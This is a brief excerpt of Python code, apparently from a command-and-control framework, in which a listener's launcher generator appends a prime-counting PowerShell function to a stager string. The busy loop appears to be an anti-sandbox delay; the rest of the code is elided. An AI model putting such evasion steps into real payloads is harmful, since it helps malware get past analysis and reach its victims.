...
class Listener:
    ...
    def generate_launcher(
        ...
        if language == "powershell":
            ...
            stager += "function Perform-PrimeCheck { $maxNumber = 567765; $primes = @(); for ($i = 2; $i -le $maxNumber; $i++) { $isPrime = $true; for ($j = 2; $j -le [math]::Sqrt($i); $j++) { if ($i % $j -eq 0) { $isPrime = $false; break } }; if ($isPrime) { $primes += $i } } };"
